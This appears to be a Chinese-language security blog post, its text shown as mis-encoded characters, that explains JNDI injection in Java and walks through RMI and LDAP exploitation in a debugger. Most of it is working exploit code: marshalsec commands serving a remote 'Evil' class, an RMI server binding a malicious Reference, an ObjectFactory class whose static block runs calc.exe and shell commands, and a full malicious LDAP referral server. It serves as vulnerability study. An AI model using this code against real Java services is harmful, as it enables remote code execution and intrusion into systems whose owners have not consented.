<h2 id="JNDIæ³¨å…¥åŸç†"><a href="#JNDIæ³¨å…¥åŸç†" class="headerlink" title="JNDIæ³¨å…¥åŸç†"></a>JNDIæ³¨å…¥åŸç†</h2><p><img src="/images/3601f4cbc141e3e07951413276407fc5.png"></p>
<p><code>lookup()</code>å‡½æ•°å‚æ•°å¤–éƒ¨å¯æ§æˆ–<code>Referenceç±»</code>æ„é€ æ–¹æ³•çš„<code>classFactoryLocationå‚æ•°</code>å¤–éƒ¨å¯æ§æ—¶ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥è®©å…¶åŠ è½½æˆ‘ä»¬çš„æ¶æ„Referenceç±»ï¼Œå¯¼è‡´RCEã€‚ï¼ˆrmiçš„functionå®é™…ä¸Šæ˜¯åœ¨æœåŠ¡ç«¯æ‰§è¡Œçš„ï¼Œä½†æ˜¯æ³¨å†ŒReferenceåå®¢æˆ·ç«¯ä¼šä»å…¶ä¸­çš„è¿œç¨‹å·¥å‚åœ°å€ä¸­åŠ è½½æ¶æ„ç±»ï¼Œç›´æ¥å°†å¯¹è±¡å†™åœ¨æ„é€ æ–¹æ³•æˆ–è€…é™æ€ä»£ç å—ä¸­ï¼Œå½“è¢«è°ƒç”¨æ—¶ï¼Œå®ä¾‹åŒ–ä¼šé»˜è®¤è°ƒç”¨æ„é€ æ–¹æ³•ï¼Œä»¥åŠé™æ€ä»£ç å—ï¼Œå°±åœ¨è¿™é‡Œå®ç°äº†ä»»æ„ä»£ç æ‰§è¡Œï¼‰</p>
<p>æ¡ä»¶ï¼š</p>
<blockquote>
<p>å®¢æˆ·ç«¯çš„lookup()æ–¹æ³•çš„å‚æ•°å¯æ§</p>
<p>æœåŠ¡ç«¯åœ¨ä½¿ç”¨Referenceç±»æ—¶ï¼ŒclassFactoryLocationå‚æ•°å¯æ§</p>
<p>ä¸Šé¢ä¸¤ä¸ªéƒ½æ˜¯åœ¨ç¼–å†™ç¨‹åºæ—¶å¯èƒ½å­˜åœ¨çš„è„†å¼±ç‚¹ï¼ˆä»»æ„ä¸€ä¸ªæ»¡è¶³å°±è¡Œï¼‰ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œjdkç‰ˆæœ¬åœ¨JNDIæ³¨å…¥ä¸­ä¹Ÿèµ·ç€è‡³å…³é‡è¦çš„ä½œç”¨ï¼Œè€Œä¸”ä¸åŒçš„æ”»å‡»Payloadå¯¹jdkçš„ç‰ˆæœ¬è¦æ±‚ä¹Ÿä¸ä¸€è‡´ï¼Œè¿™é‡Œå°±å…¨éƒ¨åˆ—å‡ºæ¥ï¼š</p>
<p>JDK 6u45ã€7u21ä¹‹åï¼šjava.rmi.server.useCodebaseOnlyçš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºtrueã€‚å½“è¯¥å€¼ä¸ºtrueæ—¶ï¼Œå°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„java.rmi.server.codebaseæŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯JVMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚</p>
<p>JDK 6u141ã€7u131ã€8u121ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚</p>
<p>JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.ldap.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚</p>
</blockquote>
<h2 id="RMI-JNDI"><a href="#RMI-JNDI" class="headerlink" title="RMI+JNDI"></a>RMI+JNDI</h2><p>å®æˆ˜ä¸­ç”¨marshalsecå¿«é€Ÿèµ·æœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://127.0.0.1:8000/#Evil&quot;</span> 1099</span><br></pre></td></tr></table></figure>

<p>clientï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/ref&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>rmiserverï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rmiserver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;http://127.0.0.1:1234/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;ref&quot;</span>,refWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰å›æ˜¾çš„æ¶æ„ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exploit.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> runtime.exec(<span class="string">&quot;cmd.exe /c dir&quot;</span>);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;gb2312&quot;</span>));</span><br><span class="line">            <span class="keyword">while</span>(br.readLine()!=<span class="literal">null</span>)</span><br><span class="line">                System.out.println(br.readLine());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è°ƒè¯•è¿‡ç¨‹ï¼š"><a href="#è°ƒè¯•è¿‡ç¨‹ï¼š" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹ï¼š"></a>è°ƒè¯•è¿‡ç¨‹ï¼š</h3><p><code>lookup</code>ä¸‹æ–­ç‚¹è¿›å»</p>
<p><img src="/images/cd7b6c701c62f6ef9c14f6a2b9780001.png"></p>
<h4 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h4><p><code>getURLOrDefaultInitCtx</code>å¯ä»¥ç”¨é€šè¿‡åè®®è¿”å›ä¸åŒå¯¹è±¡ï¼ˆä¸Šä¸‹æ–‡å·¥å‚ï¼‰,ç®€å•è·Ÿè¿›ä¸€ä¸‹</p>
<p><img src="/images/9832a72dfa394ee925f0d68a213a9b88.png"></p>
<h5 id="getURLOrDefaultInitCtx"><a href="#getURLOrDefaultInitCtx" class="headerlink" title="getURLOrDefaultInitCtx"></a>getURLOrDefaultInitCtx</h5><p>å¦‚æœè®¾ç½®äº†<code>initctx_factory_builder</code>ï¼Œä¼˜å…ˆç”¨å®ƒæ¥è·å–ä¸Šä¸‹æ–‡ï¼Œå¦åˆ™è·å–schemeï¼ˆè¿™é‡Œæ˜¯rmiï¼‰ï¼Œé€šè¿‡schemeè·å–ä¸Šä¸‹æ–‡ï¼Œå¦‚æœå†è·å–å¤±è´¥åˆ™è¿”å›é»˜è®¤ä¸Šä¸‹æ–‡ã€‚</p>
<p><img src="/images/9b86a64bff1978169fa023823597d50d.png"></p>
<h4 id="lookup-1"><a href="#lookup-1" class="headerlink" title="lookup"></a>lookup</h4><p>å†æ¥è·Ÿè¿›rmiContextçš„lookupæ–¹æ³•ï¼Œ</p>
<p><img src="/images/48a153e58368a6f6eba50b639cf6d682.png"></p>
<h5 id="getRootURLContext"><a href="#getRootURLContext" class="headerlink" title="getRootURLContext"></a>getRootURLContext</h5><p><code>getRootURLContext(var1, this.myEnv)</code>å…ˆæ ¡éªŒurlçš„æ­£ç¡®æ€§ï¼Œé¡ºä¾¿æ‹†åˆ†</p>
<p><img src="/images/c886b205d204a6020179c6c1f86d7f00.png"></p>
<p>ç„¶åvar15æ˜¯è¿œç¨‹æ³¨å†Œä¿¡æ¯ä¸Šä¸‹æ–‡ï¼Œè¿™é‡Œä¹Ÿèƒ½çœ‹å‡º<code>this.myEnv</code>(var2)æ˜¯ç”¨æ¥æ§åˆ¶è¿æ¥é—®é¢˜çš„ï¼ˆgetRegistryè·å–è¿œç¨‹æ³¨å†Œè¡¨ï¼‰</p>
<p><img src="/images/ee37beafe07f8018a4569828c0c1b7e0.png"></p>
<p>æœ€åå°è£…æˆäº†<code>ResolveResult</code></p>
<p><img src="/images/f589b991d6a144117f10669b77ae09d7.png"></p>
<p>å›åˆ°lookupï¼ŒåˆæŠŠå®ƒä»¬åˆ†åˆ«å–å‡ºæ¥äº†</p>
<p><img src="/images/3fa9ed28c565aeed58678094ab9f492a.png"></p>
<h4 id="lookup-2"><a href="#lookup-2" class="headerlink" title="lookup"></a>lookup</h4><p>å†æ¥çœ‹ä¸‹ä¸€å±‚è°ƒç”¨çš„è¿œç¨‹æ³¨å†Œä¿¡æ¯ä¸Šä¸‹æ–‡çš„lookupï¼Œè‚¯å®šæ˜¯é€šè¿‡æ³¨å†Œè¡¨è·å–è¿œç¨‹ç±»äº†ï¼Œæ³¨å†Œäº†ä¸€ä¸ªè¿œç¨‹var2å¯¹è±¡ï¼Œç„¶åé€šè¿‡æ³¨å†Œä¿¡æ¯å–å›äº†ä¸€ä¸ª<code>ReferenceWrapper_Stub</code>ç±»å®ä¾‹ï¼Œè¯¥ç±»å®ä¾‹å°±æ˜¯å¯¹æˆ‘ä»¬æ¶æ„Referenceç±»çš„å°è£…ï¼Œæœ€åè°ƒç”¨decodeObject()å‡½æ•°æ¥è§£æ</p>
<p><img src="/images/ac13a3c78b7990723e1820775fee5211.png"></p>
<p>decodeObject</p>
<p>çœ‹çœ‹decodeObjectï¼Œç¡®å®</p>
<p><img src="/images/71ee134ba60bbcfdb2feed5305e141d3.png"></p>
<p>å¦‚æœæ˜¯RemoteReferenceçš„å¯¹è±¡å°±è°ƒç”¨getReferenceæ‹¿å›Referenceï¼Œç„¶åè°ƒç”¨<code>NamingManager.getObjectInstance(var3, var2, this, this.environment)</code>æ¥è·å–æ–‡ä»¶ç³»ç»ŸæœåŠ¡å™¨ä¸Šçš„æ¶æ„ç±»ã€‚</p>
<p><img src="/images/468b5c234655ff3c58cdfa6066326741.png"></p>
<p><code>getObjectFactoryFromReference</code>ä¸»è¦å°±æ˜¯å±æ€§çš„loadclasså’Œnewinstanceäº†ï¼Œç„¶åè¦æ¶æ„ç±»æ²¡ç»§æ‰¿ObjectFactoryæˆ–è€…ï¼Œæ²¡å®ç°<code>getObjectInstance</code>è‚¯å®šæ˜¯ä¼šæŠ¥é”™çš„ï¼Œä½†æ¶æ„ä»£ç æ—©å°±è¢«æ‰§è¡Œäº†ã€‚</p>
<p>ä¸ºä»€ä¹ˆåˆgetObjectInstanceå‘¢ï¼Ÿä¸ºäº†å®ç°ç»Ÿä¸€æ¥å£ï¼Œè¿”å›çš„factoryéƒ½æ˜¯ObjectFactoryç±»ï¼Œæ‰€ä»¥å†æä¾›äº†getObjectInstanceçš„è°ƒç”¨è®©å®ƒå¯ä»¥å˜æˆå…¶ä»–æˆ‘ä»¬æƒ³è¦çš„å¯¹è±¡ï¼ˆè¿™å¯¼è‡´äº†JNDIåœ¨é«˜ç‰ˆæœ¬ä½¿ç”¨æœ¬åœ°å·¥å‚ç±»çš„ç»•è¿‡ï¼‰</p>
<h2 id="LDAP-JNDI"><a href="#LDAP-JNDI" class="headerlink" title="LDAP+JNDI"></a>LDAP+JNDI</h2><p>å®æˆ˜å¿«é€Ÿèµ·serverï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:8000/#Evil&quot;</span> <span class="number">1389</span></span><br></pre></td></tr></table></figure>

<p>demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">(InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//             Payload1: åˆ©ç”¨ LDAP + Reference Factory</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line"><span class="comment">//             Payload2: è¿”å›åºåˆ—åŒ– Gadget</span></span><br><span class="line"><span class="comment">//            try &#123;</span></span><br><span class="line"><span class="comment">//                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;...&quot;));</span></span><br><span class="line"><span class="comment">//            &#125; catch (ParseException exception) &#123;</span></span><br><span class="line"><span class="comment">//                exception.printStackTrace();</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.el.ELProcessor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;ldap://127.0.0.1:1099/ref&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

